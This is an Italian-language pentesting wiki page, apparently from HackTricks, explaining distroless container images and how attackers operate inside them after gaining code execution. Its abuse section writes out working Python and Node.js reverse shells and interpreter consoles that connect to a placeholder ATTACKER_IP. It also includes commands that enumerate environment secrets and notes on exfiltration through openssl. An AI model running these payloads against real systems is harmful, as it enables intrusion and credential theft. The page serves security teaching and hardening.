# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## Panoramica

Un'immagine container **distroless** include i **componenti runtime minimi necessari per eseguire una specifica applicazione**, rimuovendo intenzionalmente i normali strumenti della distribuzione, come package manager, shell e ampi set di utilità generiche userland. In pratica, le immagini distroless spesso contengono solo il binario o il runtime dell'applicazione, le librerie condivise, i bundle di certificati e una struttura del filesystem molto ridotta. <sup>[[1]](#references)</sup>

Il punto non è che distroless sia una nuova primitiva di isolamento del kernel. Distroless è una **strategia di progettazione delle immagini**. Modifica ciò che è disponibile **all'interno** del filesystem del container, non il modo in cui il kernel isola il container. Questa distinzione è importante, perché distroless rafforza l'ambiente soprattutto riducendo ciò che un attaccante può usare dopo aver ottenuto l'esecuzione di codice. Non sostituisce namespace, seccomp, capabilities, AppArmor, SELinux o qualsiasi altro meccanismo di isolamento runtime.

## Perché Esiste Distroless

Le immagini distroless vengono usate principalmente per ridurre:

- le dimensioni dell'immagine
- la complessità operativa dell'immagine
- il numero di pacchetti e binari che potrebbero contenere vulnerabilità
- il numero di strumenti di post-exploitation disponibili per impostazione predefinita a un attaccante

Per questo le immagini distroless sono diffuse nei deployment di applicazioni in produzione. Un container che non contiene shell, package manager e quasi nessuno strumento generico è in genere più semplice da gestire operativamente e più difficile da sfruttare in modo interattivo dopo una compromissione.

Esempi di famiglie di immagini distroless note includono:

- le immagini distroless di Google <sup>[[1]](#references)</sup>
- le immagini hardened/minimal di Chainguard <sup>[[2]](#references)</sup>

## Cosa Non Significa Distroless

Un container distroless **non è**:

- automaticamente rootless
- automaticamente non privilegiato
- automaticamente in sola lettura
- automaticamente protetto da seccomp, AppArmor o SELinux
- automaticamente al sicuro dal container escape

È comunque possibile eseguire un'immagine distroless con `--privileged`, condividendo namespace dell'host, usando bind mount pericolosi o montando un socket runtime. In questo scenario, l'immagine può essere minimale, ma il container può comunque essere catastroficamente insicuro. Distroless modifica la **superficie d'attacco userland**, non il **confine di fiducia del kernel**.

## Caratteristiche Operative Tipiche

Quando comprometti un container distroless, la prima cosa che noti di solito è che le supposizioni comuni non sono più valide. Potrebbero non esserci `sh`, `bash`, `ls`, `id`, `cat` e talvolta nemmeno un ambiente basato su libc che si comporti come ci si aspetta usando le normali tecniche operative. Questo influisce sia sull'offense sia sulla defense, perché l'assenza di strumenti cambia il debugging, la risposta agli incidenti e la post-exploitation.

Gli schemi più comuni sono:

- il runtime dell'applicazione è presente, ma c'è poco altro
- i payload basati su shell falliscono perché non è disponibile una shell
- i comuni one-liner di enumeration falliscono perché mancano i binari ausiliari
- spesso sono presenti anche protezioni del filesystem, come una rootfs in sola lettura o `noexec` sulle posizioni tmpfs scrivibili

È questa combinazione che porta spesso a parlare di "weaponizing distroless".

## Distroless E Post-Exploitation

La principale difficoltà offensiva in un ambiente distroless non è sempre l'RCE iniziale. Spesso è ciò che viene dopo. Se il workload compromesso permette l'esecuzione di codice in un runtime di linguaggio come Python, Node.js, Java o Go, potresti riuscire a eseguire logica arbitraria, ma non attraverso i normali workflow basati sulla shell, comuni in altri target Linux.

Di conseguenza, la post-exploitation si orienta spesso verso una di queste tre direzioni:

1. **Usare direttamente il runtime di linguaggio esistente** per enumerare l'ambiente, aprire socket, leggere file o preparare payload aggiuntivi.
2. **Caricare i propri strumenti in memoria** se il filesystem è in sola lettura o le posizioni scrivibili sono montate con `noexec`.
3. **Abusare dei binari già presenti nell'immagine** se l'applicazione o le sue dipendenze includono qualcosa di inaspettatamente utile.

## Abuso

### Enumerare Il Runtime Già Disponibile

In molti container distroless non c'è una shell, ma è comunque presente un runtime dell'applicazione. Se il target è un servizio Python, Python è disponibile. Se il target è Node.js, Node è disponibile. Spesso questo fornisce funzionalità sufficienti per enumerare i file, leggere le variabili d'ambiente, aprire reverse shell e preparare l'esecuzione in memoria senza mai invocare `/bin/sh`.

Un semplice esempio con Python:

```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```

Un semplice esempio con Node.js:

```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```

Impatto:

- recupero delle variabili d’ambiente, che spesso includono credenziali o endpoint di servizio
- enumerazione del filesystem senza `/bin/ls`
- identificazione dei percorsi scrivibili e dei secret montati

### Runtime interattivo senza `/bin/sh`

Se l’immagine non contiene `sh` o `bash`, una reverse shell classica basata su shell non funziona. In tal caso, esponi una sessione interattiva nel runtime del linguaggio installato invece di avviare una shell inesistente.

Ad esempio, questo payload Python reindirizza una console Python interattiva attraverso un socket:

```bash
python3 - <<'PY'
import code, socket, sys
s = socket.create_connection(("ATTACKER_IP", 4444))
stream = s.makefile("rw", buffering=1)
sys.stdin = sys.stdout = sys.stderr = stream
code.interact(local=globals())
PY
```

L’approccio equivalente in Node.js può valutare JavaScript ricevuto tramite un socket. È una REPL JavaScript, non una shell del sistema operativo; le operazioni sul file system, sui processi e sulla rete devono essere eseguite tramite le API di Node:

```bash
node -e 'const net=require("net");const s=net.connect(4444,"ATTACKER_IP");s.on("data",d=>{try{s.write(String(eval(d.toString()))+"\n")}catch(e){s.write(String(e)+"\n")}});'
```

Entrambi gli esempi richiedono connettività in uscita e un interprete disponibile, e forniscono solo le funzionalità esposte da tale interprete.

Se l'immagine include inaspettatamente `/bin/sh`, i classici payload shell assistiti da interprete restano utili. Sono mostrati separatamente perché non sono davvero privi di shell:

```bash
# Python plus an existing /bin/sh
python3 - <<'PY'
import os, pty, socket
s = socket.create_connection(("ATTACKER_IP", 4444))
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)
pty.spawn("/bin/sh")
PY

# Node.js plus an existing /bin/sh
node -e 'const net=require("net"),cp=require("child_process");const s=net.connect(4444,"ATTACKER_IP",()=>{const p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```

Il vecchio pattern Python a loop di comandi è utile anche quando `/bin/sh` è presente, ma una PTY interattiva è scomoda. È mantenuto qui esplicitando la sua dipendenza effettiva: `subprocess.run(..., shell=True)` invoca la shell di sistema e quindi **non** è una tecnica no-shell.

```bash
python3 -c '
import subprocess
while True:
    cmd = input("sh> ")
    if cmd.strip() in ("exit", "quit"):
        break
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    print(result.stdout, end="")
    print(result.stderr, end="")
'
```

### Esempio completo: loop di comandi Python senza shell

Se l’immagine include Python ma non una shell, un REPL Python locale può comunque consentire di ispezionare il filesystem, l’ambiente e la rete:

```bash
python3 - <<'PY'
namespace = {}
while True:
    source = input("py> ")
    if source.strip() in ("exit", "quit"):
        break
    try:
        result = eval(source, namespace)
        if result is not None:
            print(repr(result))
    except SyntaxError:
        exec(source, namespace)
PY
```

Questo loop non invoca `/bin/sh`. Valuta direttamente espressioni e istruzioni Python, quindi le operazioni devono usare le API Python anziché comandi shell. Con questa limitazione, può comunque offrire gran parte delle funzionalità di una shell di base: enumerazione di file system e ambiente, accesso ai dati, attività di rete e preparazione di ulteriori payload tramite il runtime installato.

### Esecuzione di strumenti in memoria

Le immagini Distroless sono spesso combinate con:

- `readOnlyRootFilesystem: true`
- tmpfs scrivibile ma `noexec`, come `/dev/shm`
- assenza di strumenti per la gestione dei pacchetti

Questa combinazione rende inaffidabili i flussi di lavoro classici del tipo «scarica un binario su disco ed eseguilo». In questi casi, le tecniche di esecuzione in memoria diventano la soluzione principale.

La pagina dedicata è:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Le tecniche più pertinenti sono:

- `memfd_create` + `execve` tramite runtime di scripting <sup>[[4]](#references)</sup>
- DDexec / EverythingExec
- memexec
- memdlopen

Per un servizio Python, Node.js o PHP, il punto di ingresso può essere un bug applicativo come template injection, prototype pollution o unsafe evaluation. Se consente l'esecuzione di codice all'interno del processo, una tecnica basata su `/proc/self/mem` può eseguire un loader senza shell né file eseguibile su disco. L'esecuzione avviene comunque con l'identità del processo del container; per evadere dal container è necessaria una vulnerabilità distinta nel runtime o nel confine con l'host. Per i prerequisiti, consulta le [tecniche per ambienti read-only/noexec/distroless](../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/README.md).

### Binari già presenti nell'immagine

Alcune immagini Distroless contengono comunque binari necessari dal punto di vista operativo, che diventano utili dopo una compromissione. Un esempio osservato ripetutamente è `openssl`, perché talvolta le applicazioni ne hanno bisogno per attività legate alla crittografia o a TLS.

Un modello di ricerca rapido è:

```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```

Se è presente `openssl`, potrebbe essere utilizzabile per:

- connessioni TLS in uscita
- exfiltration dei dati attraverso un canale di egress consentito
- preparazione dei dati del payload tramite blob codificati/crittografati

L'abuso specifico dipende da ciò che è effettivamente installato, ma l'idea generale è che distroless non significa «nessuno strumento»; significa «molti meno strumenti rispetto a un'immagine di una distribuzione normale».

## Verifiche

L'obiettivo di queste verifiche è determinare se l'immagine è davvero distroless nella pratica e quali runtime o binari helper sono ancora disponibili per il post-exploitation.

```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```

Cosa è interessante qui:

- Se non è presente alcuna shell, ma è disponibile un runtime come Python o Node, il post-exploitation dovrebbe passare all'esecuzione tramite runtime.
- Se il root filesystem è in sola lettura e `/dev/shm` è scrivibile ma `noexec`, le tecniche di esecuzione in memoria diventano molto più rilevanti.
- Se sono presenti binari ausiliari come `openssl`, `busybox` o `java`, potrebbero offrire funzionalità sufficienti per avviare ulteriori operazioni di accesso.

## Impostazioni predefinite del runtime

| Stile di immagine / piattaforma | Stato predefinito | Comportamento tipico | Indebolimenti manuali comuni |
| --- | --- | --- | --- |
| Immagini Google distroless | Userland minimale per progettazione | Nessuna shell, nessun package manager, solo dipendenze dell'applicazione/runtime | aggiunta di layer di debug, shell sidecar, copia di busybox o strumenti |
| Immagini Chainguard minimal | Userland minimale per progettazione | Superficie dei pacchetti ridotta, spesso incentrata su un singolo runtime o servizio | uso di varianti `:latest-dev` o di debug, copia di strumenti durante la build |
| Workload Kubernetes che usano immagini distroless | Dipende dalla configurazione del Pod | Distroless influisce solo sull'userland; la postura di sicurezza del Pod dipende comunque dalla specifica del Pod e dalle impostazioni predefinite del runtime | aggiunta di container di debug effimeri, mount dell'host, impostazioni del Pod privilegiato |
| Docker / Podman che eseguono immagini distroless | Dipende dai flag di esecuzione | Filesystem minimale, ma la sicurezza del runtime dipende comunque dai flag e dalla configurazione del daemon | `--privileged`, condivisione dei namespace dell'host, mount dei socket del runtime, bind mount dell'host scrivibili |

Il punto chiave è che distroless è una **proprietà dell'immagine**, non una protezione del runtime. Il suo valore deriva dalla riduzione di ciò che è disponibile nel filesystem dopo una compromissione. Le build multi-stage sono un metodo comune per escludere gli strumenti di build dall'immagine finale. <sup>[[3]](#references)</sup>

## Pagine correlate

Per i bypass delle protezioni del filesystem e dell'esecuzione in memoria comunemente necessari negli ambienti distroless:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Per gli abusi del runtime dei container, dei socket e dei mount che si applicano anche ai workload distroless:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## References

- [1] [GoogleContainerTools - Immagini container distroless](https://github.com/GoogleContainerTools/distroless)
- [2] [Documentazione di Chainguard Images](https://edu.chainguard.dev/chainguard/chainguard-images/)
- [3] [Docker Docs - Build multi-stage](https://docs.docker.com/build/building/multi-stage/)
- [4] [`memfd_create(2)` - Pagina del manuale Linux](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
{{#include ../../../banners/hacktricks-training.md}}
